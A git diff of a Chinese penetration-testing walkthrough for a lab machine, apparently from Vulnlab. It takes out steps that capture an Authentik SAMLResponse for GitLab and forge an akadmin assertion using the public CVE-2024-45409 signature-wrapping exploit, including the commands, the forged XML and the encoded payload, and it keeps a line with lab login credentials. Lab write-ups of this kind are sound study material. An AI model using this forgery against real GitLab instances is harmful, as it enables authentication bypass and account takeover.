@@ -372,88 +372,6 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 ### Authentik - TCP 9000 / 9443
 #### Authentik是一款开源的身份提供商 (IdP) 和单点登录 (SSO) 解决方案，SSO = Single Sign-On（单点登录）
 #### 它支持 SAML、OAuth2、OpenID Connect 和 LDAP 等协议，使组织能够集中管理跨多个应用程序的身份验证，并作为 GitLab、Grafana、Nextcloud 等服务的统一登录门户。它采用自托管模式，通常通过 Docker 进行部署。
-#### 使用 Satoru 凭据登录成功，显示两个应用程序 'satoru','dGJ2V72SUEMsM3Ca'
-#### 点击第一个应用“Gitlab”，Fn12的Network:显示302的那一个（在第一个），查看请求，发现它使用SAML对 GitLab 进行身份验证：
-<details>
-<summary>GET https://gitlab.barrier.vl/users/auth/saml/callback?SAMLResponse</summary>
-
-```
-GET
-	https://gitlab.barrier.vl/users/auth/saml/callback?SAMLResponse=nVjXjtvKsn3nVxizHwWbWaQG28ZlFCmJWZRIvVwwNIMYxSCGrz/UjMfb4237+F5gAE0Xq1evqq4Oq/9uvSKvn03Q1lXZgg9jkZft84vx81PflM+V16btc+kVoH3ugmeLUQ7P2CfkuW6qrgqq/Om7Lr/v4bUtaLq0Kt+6hO3np6Tr6mcYHobh04B/qpoYxhAEgZENvPiEbRr/9eZdhL+HL0DnhV7nvfmPoAx+gY/CCPHAXzwW+BNo2oXV56cF5emD3LY9kMu288puMSHY+iOCf8SRI0I/I9QzQl+ePvCg7dLS6156PUZolyHitMs9/5PvNU0Kmk/3HO6XeFvY67sEfmQHDrw8970gWwbhPz/9LwFQylv7nofhAYFTaw/gIUHSZISQAYmQ1NOXvx/dnl8YNV8eOKDs0uxv+Hvz368TaHVe17fvW1wVgg8nL+/B7zPXvng/W30QgLZ9gr+8jvAe9Jl5m74fE/aIhV5TNEGDAEEDnAAbwifxKEKIAGxQAo821B/l9c/iDRemabxkv2/AF+itCUK5jKrXNueVVZku2U7nlzlSQJdU4Qcmj6sm7ZLil1WBIo+q+AjG4GOAEuVfSyqgd+P9MdJrfT3q92NRNeCvpvU+tomHkes3TBNEoFkKEHywTfnz01//PYWv/Y6NV7ZR1RTtD+3/yurdqgLlHeRVDcKP7Vtwb8z+HPEXGYN/QpNP42XR/B/z91if77P2CvNS0194cxf0RHFMQh0XfNydeFfO5oxjWeSW41ojrhWj2IyyslU+v3D6vvMry2+T8LX9YyV9m/jXTtX2LIqbyVfVm5j6UratPTjyQu2OsgHp3ESZ4YJ7m5KbA6GFubgGw96kZDikbcfRndMBog4Kk+iDQ5CYb3EX6uzzSGsUTrpbwYWqa0wtnlz13NrXXe7d8mFW+62xO+zqbCricxVA/DmRD3K6OSk+ULE70Tp3XgmI0dGYLROE/nGDUGtWmXJRCflxPWeeOpV9w58pfUvz6gxp3Wj0VH30U5ZRbpfTmi8NaZdX1wtNzxPlJ3MbzYmGnbe0SSD7HhVua+ayUnPitJFx9wT5EWI6CkK0Qm4opNkikY6L6H5GQsqUEhrD8lVHMWc09g5DfGijezDi+H3rUxhZ3MRZhS6EX5VTj8EeYwS8RkozxpHOhT/VGQIfEd5mZiFTwEXxOgWdq2xSnVW9x9ik062VZ+CQYLkScsiYqmZGubXEFe2V0i1BzW4DmvXcU9tsTfu7HvYQRsB6mBkFe9UpmdeK17R0ZSjab6Z9mJ0yXjKjEBW5TuhjNyNRqw4csjdjJJsUCUYqZ19F7SZwN9uMI00Wy7yRIZUaomw1nAHLnmj/aNsgFK8GwqG3BtZlmJDp4IocwmigbnoCCwOyVpqzO2RJzYWtW5pmOUOOwWZLeNGdC5S76mr5Xl5l2bLrb6icsq9MctxIJ3g1RLBqs1QQDUspzKpf4EUwABI7Q8LK6jgDUKiDCwdmihnPBjtBGtfblWREI2yLvq/ohHvfZZ+/VfZ3lfxS3Xsw/VPqzjI4vxyf/7S4x3YfLftoB74osizaM8cxcx8zg8wysWzsO8PakLN2TNd24lNaVVRExzMqG2e3JEu3mwFhGaMVGZ4BkGIOwzZ2+ZNh8DyrJqFjVpcziXjnNlauzKRyxKhwBKqwhMMfZUQ5yqPKC6gyx4OKVg60GNEX4/GbcThdhZvCxVsGtQVmGBLXOSHe9tSH27yRRTX3t24XYHnpF6cMkgU1D0qzvhT51XXMXDHlQWBeGO15Jv+e0SjyjMXG6ollWoVDX4GgN6QlF5x8/TFOQWQYjWNimnl85+L98v9CirDo7TbCRoRioZSfRB4/7qUtu+nEEjFlRATFxeMibsRM+zzfuNNq0md2Fc0cqke0rcSyTocxuBQ1LhnQFg+vdc0n6XUlrwrheD8YoWUkdJNtps5Wzig4xOrxrgoSIkvoKOyEoJC0oz4EltqAOYMmuUK0y3nLijV9yvF4Ox8CsOvr0Os3ou2mJ21L1MAOrWvj6uvxoNKyXqHrfYKurvTIr6Blm1Bv12yEtyaFFFGsX2+WhgoMd62l6TonbdPvCTw8TgHvjzetclG8NhthrCh74+aCBs1iU3dAx9BWOswhkq1ohNNv8EU/504re9EOpXeauDLOHE/vYUksfK7epEmI14Z1uWUehEgjNpviNLLsduiq8107nLPVbeX77iF03NRyNMm7TCPt6+IGt7GbbvPIMVzJwKjpvhwhq2n684lCDiTbtWg6rQOjoO9whJoibCCdodexxXhbOBkDK9YYYjwMrGOiE9iW0VnHB+jUHxtLZmzNn4pVvGOJeCuJerENy2lz7hLFsIDvT+xWvEpskN/6M3MkjjF1tLYxRlpuBokV7LiSQRSro1/LDGW67bUBTHZdSxrjKXTc9g51kw6hSg04sSVzAjj3VEdKUa92uHOHLtwmWasj199vniRE7GqzCgCWp71Au6LL+NV5d3ADpQlWLN8fkW1HmnpLi7bNxXd7pdeQlvKs1h2M4ryZHc4grYMf6jbOlILi7aaWY5aVwXjqSRGVwTaWNWIiJmNIMCsEg+nueEizd06QJXtPZHOlNAUL36kBQkz2nO8M1KwVsS4txDSsU+LZaM2fzmPlWuR8OY/FwVFr6IKR+YUjSx8T0XCb5P6yMr2JrP35JxvIy8ISmKZNZAeJQN6CHDrSPJWCsQyrVYtRmIcsxQsnF8NeXzU9G9JJwWJy34zsfj5r7DHr8THPRPgG4j4LTlUGrQRXdXq3Nyd5o4nR8TL3vFoq2W6axpA+DcnQkerOPNjuLnf6mrnrTRatj1lUcLt8O0WQq89FEeqhI3FitxuLaVdpCNIf5GmF4OJdFxhUSwcuDWnPCEQGRnuSPVoevr+w1ZoVOchI1AO8Gp1qVSkzGlz2QkMnHEan9mjdD5HBdI7R6eUmrlHyfsipS1TpnGgeYlzg0XtVQ+GVKc9SwLXIbllqudZtQte6dn0qyLOa7VKF1GKA0VrAuq7l+Ajo3fw6H/1x1ity31FQwkm7WY2cZS7zg5g2E6cdWEy4FPha5nr2cPIvKWNOkk9rmWkUyx6/g/v7ubcCySkPGgLVRyvatBJqFby7vWY4rPPXTJJ2TOiJBob2DFtG8jkvriLR9sfiJCt+09lal5RmWDtwBPEx78MuSaLXQ+RImEvBmrPcwZIB9qT7pieO4vro3mp1CJVue+VWG1mgluvAej9k8B7pKchWHC1k3bNL+HexTrQzj7axZLjhDWOWTawU9nZ1mHJ8yLxQPTfYyeYKfnfgZJSS8LHpoahvUCqjOrRW77Z3tYFzY5tbHB1up8jS4iwyE8FKb6fT5e6SQnMhOeM6bwL5PGEhPvI9tC0ZmCwyDcZcXsVhFSCkU0Yr5cSu6LIfPr9eLX88Uf+xfj114Xcn8rsz+6swsnr/CoLua0tddJzMfxCXO7bX/VrgoZ/QF0safoxeXJ/7sq1BsPAA4dOX1uuqpv8qsV4h34/GVWWUPvo9lN/r/f33ajIonn3gNaB5+jXQI+QPatVppdYwUQeaHxUhir0qbXMhWqfgIRn/Hzr7Tcn+jMIPn75yXTzC9PG5fdBjwZIy8C+1+pXbH/CH37Tzwq18qGlQLLF8eGn+Sgt/RbcWKb7wkMsQjJ+f/OVGi64Dn6Y3a5+kcYJASBIDhO9TKOKvQxKlNmSA45GHIwRCU3iEb0KUjEgfoYgwpL7h/Yw0+RHb/FuGv5Bc8tGBsfuJicu9tl3005ffPvkEz8HDbzHry89QNaHeVN2SbxC+KMS6arqvE/FT8J98e2f7ltM3hl3XpH7fgV9++PAo8m+6sw0SUHjtp0VstpVXvwjQoX1oUBJe/tLw8QLRTfASRVq08OKb5l4YNo93kh+RX2/Wrwvqf/4pzze6791+tP7L8F0A8Pv3l2/PM2+Pdl/+Aw==
-```
-</details>
-
-https://gchq.github.io/CyberChef/#recipe=URL_Decode(false)From_Base64('A-Za-z0-9%2B/%3D',false,false)Raw_Inflate(0,0,'Adaptive',false,false)
-<details>
-<summary>CyberChef:只要"URL Decode(Treat "+" as space)","From Base64" 和 "Raw Inflate",什么都不用勾选，直接BAKE!</summary>
-
-```
-<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:xenc="http://www.w3.org/2001/04/xmlenc#" Version="2.0" IssueInstant="2026-03-30T08:07:08Z" Destination="https://gitlab.barrier.vl/users/auth/saml/callback" ID="_4e17a6baa23c4376ae3d4585f05c5057"><saml:Issuer>authentik</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion Version="2.0" ID="_867848ec01c34e94b53ff04ce9143f97" IssueInstant="2026-03-30T08:07:08Z"><saml:Issuer>authentik</saml:Issuer><ds:Signature>
-<ds:SignedInfo>
-<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
-<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
-<ds:Reference URI="#_867848ec01c34e94b53ff04ce9143f97">
-<ds:Transforms>
-<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
-<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
-</ds:Transforms>
-<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
-<ds:DigestValue>DRJcu4mThdP3Eb3YyDYIkzkCBB0ql3OrF6MQm9xIMGM=</ds:DigestValue>
-</ds:Reference>
-</ds:SignedInfo>
-<ds:SignatureValue>oGWFF9ybNNqFibHkGpa/fadOv1Bc5XqFIACcvsi59L4OdlF6ewKR7I/d8UXXPXVL
-7LMAhPwX452bSCZ7WbD0sQmXiJ+/mNPOApFVYNWsUjJlaqlwzNuGQJLJpkymgWoc
-DWhILIi9VMbeN2v4sXvDMc4xXOAGAcdbT9076BMylFMdDx6zkaNynurDW7PG8DNz
-OtxQu7pTbiBAMqZV6DnQHJlojZ88zy7bhzsfzhO2WG8R40Ku1Eq6AZ+Nl4V9I3YV
-bf0RXM04sElQM5Rs0fP3F1Kz0d7RHh822l+t7AW1gaLwgLsfvcx33vGb725mqFzN
-Z4bonyu2/aAQcDO5Hz2C5XZDVpk0/T0DUAzEkMeZMatM1zokyNX+pK2BhtPS+aQ3
-ESYH0LkAopAxIsSF+8anHqh1Rt9er6zu7Gk68bJu/a0AE2u/AxEU+tMkasFjinYI
-fK9yKdkVkDHRfd1FCtEugYk51SpcX5uRg0kyMH/0oXKofs9cY9GkC5RB2kaxA5Mp
-7UNdzeBBV8bTUUedFjQ0C1qr/PI/4I8cj0Ldfw7qPh/Ew06MrWYwkhpCdsYnRRnz
-XQBkatMfvCcMvNYOlKI+kkc5097l7UjAhT9HV/+wf/NUB7cfwlwzzNbm3mcwe52W
-E+StCQe71X3ELAygAaUeJEHx6G+HQfx/UFbbMP4YvJk=</ds:SignatureValue>
-<ds:KeyInfo>
-<ds:X509Data>
-<ds:X509Certificate>MIIFUzCCAzugAwIBAgIQKtQS95zOTi6Uhb7Oomo4tDANBgkqhkiG9w0BAQsFADAe
-MRwwGgYDVQQDDBNhdXRoZW50aWsgMjAyNC4xMC41MB4XDTI0MTIxNDE1MzgwN1oX
-DTI1MTIxNTE1MzgwN1owVjEqMCgGA1UEAwwhYXV0aGVudGlrIFNlbGYtc2lnbmVk
-IENlcnRpZmljYXRlMRIwEAYDVQQKDAlhdXRoZW50aWsxFDASBgNVBAsMC1NlbGYt
-c2lnbmVkMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAw4S8GGf2x07B
-iDyFD3TKHGB9tFn0RI0FemZaCfCx2RUWzqCV+yPzB+fzC1Pf8UMgIP8dgeZmp3HQ
-G3djppDhij+I+mETvLQdSQh8rk9ytUMW1eLgNTvNEH0IH1xEJEcmHOTPwcSNrezk
-yIo0OZWGBFp8Vl3gGzLceJupdau9FUYiVOG4peUdSjrYP6xLN8IPo16Kh1+j8xD+
-jZ8Nqjkx/GR70mfgPjqSO1EACjpHyjzhsruK43dTycDbxqOoY13pRrExo7U9YlEO
-zFrpteP21sHLzd0k+80CPq/ZPWlXsIafJ18JOF+QWCD8K/HFmbCp9ihd3pQSZqka
-0Hx2zRFyxBBGwtoWvOLWk+q+bbYLdXYiSXOHaZyx8bPF93U2qPUD0Td+IeQp8unx
-SrruWV70L5Bts1iy6cQm8v/f1RF/Q0tQPpgSAaG/hxcSgOA4xLwBXR1yeGnfWP3w
-VuTrSIAUObym+gJB4gGHFPmGdny9WthMQSebbyBGFjHBclquWAT4Tg7TSGg25SYk
-Fo/XYHQ4m+TbpIA7RYsjreAkj6HOAaM8gsuX7qHLdN7w34G5l4eXviP0nFPoJ3Xv
-ZC9h6NxCuvqaHEfB+9+ce2liuE8YFYAboWJLYcMrc+BDuT0Gt5RPs8FUUCgvU+Pp
-OiDBOtLQmW9zXCQ5SLbdPU3AnEMaJysCAwEAAaNVMFMwUQYDVR0RAQH/BEcwRYJD
-OUJXckhKaFBlMnRES3JNc04yUzlJQ1RpMFpnS0RQSVhaU1pDVWxoYS5zZWxmLXNp
-Z25lZC5nb2F1dGhlbnRpay5pbzANBgkqhkiG9w0BAQsFAAOCAgEArshIX0felsel
-T8D7iexndo+s272a0iVO/hZQU6jOPkwiyM2g5KrxBKzWOBTku3xlkF/qegukcVok
-+EYNXuYuRyI9OFfTZzuDNnMkJyyxd8Vwhwt5NJRLUYJlXupAvPrkf6TkfmCJlGyf
-YPzmmdPdXHCFtJxmyJoO00uLIy+03FvPEA1OiwCid8aQcFA/1u5BTSa3KZBo6BFC
-QhNL/+xXo+oMz1cZKEr8hC28iUxSvLfQAtXQtPn9gp15vLl7ZfoPCFRLg3ED1vop
-djAnWHcCs0JOoYlOt9dYSjtuiEIzNkJiM5Oge28OcBYYSXb0euYljzTbxzPo5Kt7
-hCHJzNfXXcklLFiryCOLB2EZm36ICuBLVbZiARyHb8OkRQm7OoJ/uvWuScHXnLO0
-pTSf9sH1SmDYGjk3/PDjkHHJAdaFQ21uABnfIWlmjF4suTmVIMbrtUOthnRdpX/f
-DgDb/Y551jLfXH2Y7/OXgnehw/aHv9u4TF6TYqpNwdMtGjC+9IE7+pK6Kwk/K0u7
-UMXOdBYWY4bvFphOWD1sgHQYdq2ArYPnEKUoLyl3wkadNWr2VUCmDJLCI17H3xru
-fur17k7t1pNvUajUeXqBrqgfLqVfSOgkfRhESiqVVZvY5ErZ5CQjz9cIWy2d3xDu
-GnA/5mkO/2YDN3/Ne05Xnf+MVB+8nuw=
-</ds:X509Certificate>
-</ds:X509Data>
-</ds:KeyInfo>
-</ds:Signature><saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">satoru</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2026-03-30T08:12:08Z" Recipient="https://gitlab.barrier.vl/users/auth/saml/callback"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2026-03-30T08:02:08Z" NotOnOrAfter="2026-03-30T08:12:08Z"/><saml:AuthnStatement AuthnInstant="2026-03-30T08:02:08Z" SessionIndex="b68b16cb8896b583440552e4bb710b6d51795c33fa3040873f39d15f5b074dd7" SessionNotOnOrAfter="2026-05-29T08:07:08Z"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress"><saml:AttributeValue>satoru@barrier.vl</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>
-```
-</details>
-
-#### 将其保存saml.xml
-```
-[★]$ vi saml.xml
-```
 #### 查看gitlab的官方页面的版本17.3.2
 https://about.gitlab.com/releases/categories/releases/
 #### 它的补丁版本是17.3.3 
@@ -514,114 +432,13 @@ https://nvd.nist.gov/vuln/detail/CVE-2024-45409
   }
 ]
 ```
+#### 使用 Satoru 凭据登录成功，显示两个应用程序 'satoru','dGJ2V72SUEMsM3Ca'
 #### akadmin 是Authentik 使用的默认管理员名称！
 ### 利用 CVE-2024-45409 漏洞
 https://github.com/synacktiv/CVE-2024-45409
-```
-[★]$ wget https://raw.githubusercontent.com/synacktiv/CVE-2024-45409/refs/heads/main/CVE-2024-45409.py
-[★]$ pip3 install lxml
-[★]$ python3 CVE-2024-45409.py -r saml.xml -n akadmin
-[+] Parse response
-	Digest algorithm: sha256
-	Canonicalization Method: http://www.w3.org/2001/10/xml-exc-c14n#
-[+] Remove signature from response //删除原签名
-[+] Patch assertion ID		//修改 Assertion
-[+] Patch assertion NameID
-[+] Patch assertion conditions		//Conditions修改时间限制：NotBefore、NotOnOrAfter；否则SAML 可能会过期 → 登录失败
-[+] Move signature in assertion
-[+] Patch response ID		//冒充用户 akadmin
-[+] Insert malicious reference		//插入恶意引用	
-[+] Clone signature reference	//克隆签名引用
-[+] Create status detail element	//插入 StatusDetai，隐藏/承载恶意结构（绕解析）
-[+] Patch digest value		//重新计算摘要
-[+] Write patched file in response_patched.xml
-```
+
 #### 成功构造了一个 SAML 伪造响应（signature wrapping 攻击），保留合法签名
-<details>
-<summary>cat response_patched.xml</summary>
 
-```
-[★]$ cat response_patched.xml
-<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:xenc="http://www.w3.org/2001/04/xmlenc#" Version="2.0" IssueInstant="2026-03-30T08:07:08Z" Destination="https://gitlab.barrier.vl/users/auth/saml/callback" ID="ID-76a81c64-51a0-4683-8bd5-30d2c70696e0"><saml:Issuer>authentik</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/><samlp:StatusDetail><ds:Reference URI="#_867848ec01c34e94b53ff04ce9143f97">
-<ds:Transforms>
-<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
-<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
-</ds:Transforms>
-<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
-<ds:DigestValue>b9DRdBLRrh0YjMLL5nu9wzNy04rdNFq8V4XReaAhhn0=</ds:DigestValue>
-</ds:Reference>
-</samlp:StatusDetail></samlp:Status><saml:Assertion Version="2.0" ID="_867848ec01c34e94b53ff04ce9143f97" IssueInstant="2026-03-30T08:07:08Z"><saml:Issuer>authentik</saml:Issuer><ds:Signature>
-<ds:SignedInfo>
-<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
-<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
-<ds:Reference URI="#_867848ec01c34e94b53ff04ce9143f97">
-<ds:Transforms>
-<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
-<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
-</ds:Transforms>
-<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
-<ds:DigestValue>DRJcu4mThdP3Eb3YyDYIkzkCBB0ql3OrF6MQm9xIMGM=</ds:DigestValue>
-</ds:Reference>
-</ds:SignedInfo>
-<ds:SignatureValue>oGWFF9ybNNqFibHkGpa/fadOv1Bc5XqFIACcvsi59L4OdlF6ewKR7I/d8UXXPXVL
-7LMAhPwX452bSCZ7WbD0sQmXiJ+/mNPOApFVYNWsUjJlaqlwzNuGQJLJpkymgWoc
-DWhILIi9VMbeN2v4sXvDMc4xXOAGAcdbT9076BMylFMdDx6zkaNynurDW7PG8DNz
-OtxQu7pTbiBAMqZV6DnQHJlojZ88zy7bhzsfzhO2WG8R40Ku1Eq6AZ+Nl4V9I3YV
-bf0RXM04sElQM5Rs0fP3F1Kz0d7RHh822l+t7AW1gaLwgLsfvcx33vGb725mqFzN
-Z4bonyu2/aAQcDO5Hz2C5XZDVpk0/T0DUAzEkMeZMatM1zokyNX+pK2BhtPS+aQ3
-ESYH0LkAopAxIsSF+8anHqh1Rt9er6zu7Gk68bJu/a0AE2u/AxEU+tMkasFjinYI
-fK9yKdkVkDHRfd1FCtEugYk51SpcX5uRg0kyMH/0oXKofs9cY9GkC5RB2kaxA5Mp
-7UNdzeBBV8bTUUedFjQ0C1qr/PI/4I8cj0Ldfw7qPh/Ew06MrWYwkhpCdsYnRRnz
-XQBkatMfvCcMvNYOlKI+kkc5097l7UjAhT9HV/+wf/NUB7cfwlwzzNbm3mcwe52W
-E+StCQe71X3ELAygAaUeJEHx6G+HQfx/UFbbMP4YvJk=</ds:SignatureValue>
-<ds:KeyInfo>
-<ds:X509Data>
-<ds:X509Certificate>MIIFUzCCAzugAwIBAgIQKtQS95zOTi6Uhb7Oomo4tDANBgkqhkiG9w0BAQsFADAe
-MRwwGgYDVQQDDBNhdXRoZW50aWsgMjAyNC4xMC41MB4XDTI0MTIxNDE1MzgwN1oX
-DTI1MTIxNTE1MzgwN1owVjEqMCgGA1UEAwwhYXV0aGVudGlrIFNlbGYtc2lnbmVk
-IENlcnRpZmljYXRlMRIwEAYDVQQKDAlhdXRoZW50aWsxFDASBgNVBAsMC1NlbGYt
-c2lnbmVkMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAw4S8GGf2x07B
-iDyFD3TKHGB9tFn0RI0FemZaCfCx2RUWzqCV+yPzB+fzC1Pf8UMgIP8dgeZmp3HQ
-G3djppDhij+I+mETvLQdSQh8rk9ytUMW1eLgNTvNEH0IH1xEJEcmHOTPwcSNrezk
-yIo0OZWGBFp8Vl3gGzLceJupdau9FUYiVOG4peUdSjrYP6xLN8IPo16Kh1+j8xD+
-jZ8Nqjkx/GR70mfgPjqSO1EACjpHyjzhsruK43dTycDbxqOoY13pRrExo7U9YlEO
-zFrpteP21sHLzd0k+80CPq/ZPWlXsIafJ18JOF+QWCD8K/HFmbCp9ihd3pQSZqka
-0Hx2zRFyxBBGwtoWvOLWk+q+bbYLdXYiSXOHaZyx8bPF93U2qPUD0Td+IeQp8unx
-SrruWV70L5Bts1iy6cQm8v/f1RF/Q0tQPpgSAaG/hxcSgOA4xLwBXR1yeGnfWP3w
-VuTrSIAUObym+gJB4gGHFPmGdny9WthMQSebbyBGFjHBclquWAT4Tg7TSGg25SYk
-Fo/XYHQ4m+TbpIA7RYsjreAkj6HOAaM8gsuX7qHLdN7w34G5l4eXviP0nFPoJ3Xv
-ZC9h6NxCuvqaHEfB+9+ce2liuE8YFYAboWJLYcMrc+BDuT0Gt5RPs8FUUCgvU+Pp
-OiDBOtLQmW9zXCQ5SLbdPU3AnEMaJysCAwEAAaNVMFMwUQYDVR0RAQH/BEcwRYJD
-OUJXckhKaFBlMnRES3JNc04yUzlJQ1RpMFpnS0RQSVhaU1pDVWxoYS5zZWxmLXNp
-Z25lZC5nb2F1dGhlbnRpay5pbzANBgkqhkiG9w0BAQsFAAOCAgEArshIX0felsel
-T8D7iexndo+s272a0iVO/hZQU6jOPkwiyM2g5KrxBKzWOBTku3xlkF/qegukcVok
-+EYNXuYuRyI9OFfTZzuDNnMkJyyxd8Vwhwt5NJRLUYJlXupAvPrkf6TkfmCJlGyf
-YPzmmdPdXHCFtJxmyJoO00uLIy+03FvPEA1OiwCid8aQcFA/1u5BTSa3KZBo6BFC
-QhNL/+xXo+oMz1cZKEr8hC28iUxSvLfQAtXQtPn9gp15vLl7ZfoPCFRLg3ED1vop
-djAnWHcCs0JOoYlOt9dYSjtuiEIzNkJiM5Oge28OcBYYSXb0euYljzTbxzPo5Kt7
-hCHJzNfXXcklLFiryCOLB2EZm36ICuBLVbZiARyHb8OkRQm7OoJ/uvWuScHXnLO0
-pTSf9sH1SmDYGjk3/PDjkHHJAdaFQ21uABnfIWlmjF4suTmVIMbrtUOthnRdpX/f
-DgDb/Y551jLfXH2Y7/OXgnehw/aHv9u4TF6TYqpNwdMtGjC+9IE7+pK6Kwk/K0u7
-UMXOdBYWY4bvFphOWD1sgHQYdq2ArYPnEKUoLyl3wkadNWr2VUCmDJLCI17H3xru
-fur17k7t1pNvUajUeXqBrqgfLqVfSOgkfRhESiqVVZvY5ErZ5CQjz9cIWy2d3xDu
-GnA/5mkO/2YDN3/Ne05Xnf+MVB+8nuw=
-</ds:X509Certificate>
-</ds:X509Data>
-</ds:KeyInfo>
-</ds:Signature><saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">akadmin</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2026-03-31T08:39:03Z" Recipient="https://gitlab.barrier.vl/users/auth/saml/callback"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2026-03-30T08:02:08Z" NotOnOrAfter="2026-03-31T08:39:03Z"/><saml:AuthnStatement AuthnInstant="2026-03-30T08:02:08Z" SessionIndex="b68b16cb8896b583440552e4bb710b6d51795c33fa3040873f39d15f5b074dd7" SessionNotOnOrAfter="2026-03-31T08:39:03Z"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress"><saml:AttributeValue>satoru@barrier.vl</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>
-```
-</details>
-
-#### CyberChef:"Raw Deflate","To Base64","URL Encode(Encode all special chars)"
-<details>
-<summary>Output</summary>
-
-```
-7XhXj%2BLK1vY9Ev%2Bh1fsS9djGNrZbe1qvAwaDU8Bgc%2FPJMeCIAw6%2F%2FhQd5vT0O3veOef6k5CgVlU99axU1Fp%2FN06eVc960FRl0QQPQ54VzfOr8PtjVxfPpdMkzXPh5EHz3HrPBi2Jz8tv8HNVl23pldnjpy2%2F3%2BE0TVC3SVl8bPGb749x21bPENT3%2Fbce%2FVbWEbSEYRiCKQis8Zsk%2Butjde7%2FHj4PWsd3Wudj%2FRAU3j%2FgIxCM3fHBCgB%2FDOoGsPr%2BCFAeH4Sm6QKhaFqnaIEIXq6eYPQJhQ8w%2BQwTzzB5fnzggqZNCueuy9sJDTgiStrMcb%2B5Tl0nQf3tlkEd0LeBnK6Nobt1IM%2FJMtfxUnAI9%2F1R4J6IlUMi3gp7whEHfsJWJPpEuj4OTvOXHgGvqFUAP768uuj5lVf9ckcLijZJ%2F37F%2FBC%2Fu9FonbZrfh6xpR88HJ2sC35vP6AxWP1sdJ4XNM0j9DMKB6ybZC9%2F%2Bw2IlTCogemCB1MXvj%2F%2B9f%2FIFUFiZODBiIdiAYW5OBqGMOYFFIKhIUU8vszu%2Bw61UzRhWefNy%2FxnwQOdRWWdtHH%2BJwERFLcgK6vAfwIj4IWuDgDb%2FxQSgRD4DvkUDN6Th2DFX28g0K%2BYckkEXC4FbVz6f4D87%2BhqYmeJr37Qe8N5dcaLS3G6z4h6HcP2RRJFvOiofpJHGKt9mb%2BSR8zSA4eO4wL%2B%2Fsrq8%2BZ3oj9c8Sr4lb9%2BEr6HEv2RiF9DH0Tl%2F%2B3MP8mQP4tZoIDx4cF3A93HgS8UYfkuYJ2iLBKQOcn0mm9%2F7INfe%2Ffzkf%2BhO%2B%2Bx95SXdfBX3ThPXxz7X%2BTEl4D9%2F0lxj2tO33kdlh9iX0XXLmqPnC2kU8oyDHzNUKXmV5KWU4MgbaQ%2FTIpfBdWPEHjbV25OPE%2BNrixf%2BcTdppvKgULHV24I4%2BHWlRdo1rs1CU6JmOJn%2FCro9zohQD5pWpZqHcX5jBAlOlZ7C8OXrsGeiZPLwY2WW8luAeWyqtAVf7TlU2NedplzzUCadxttJ%2B6qdMyjU%2BnNZ9wpFkQhoY6SG8jLG9ZYN07ysMFS6A3t%2Be6BgokVI40ZL%2FncsJpSRx6LruZOhLohOXmaz5R20DqiOrgJQ0vX83HFFdp2l5WXM0lOI%2BHGUxNOsbI8bUgdg%2Fcdsr6u6PNCzrAjJaD2cT5zQ1i3JBhr1pkm4XoDhyrKI%2FsJ9gl9G5PLZbZoCfqERI7YR2IT3rwBRW8bl1ji%2BZWf5PnsjLllMXZLyKE1j1Pw7bRkcevMHasUhg4wZ9LTOpWCs%2BS0EjKV6Shbi2q%2FZOJWNRaOhs5na8PewmJKlxU9CI3BL0in2F5jRG%2BpoF5NHbFJV6S76yAHptfLDqKHtblopdRp%2BEtS2MJ8Fu6pce%2Bnx5Tb6qGP8Gy77iI7xRGj8iy80yM4HaUtB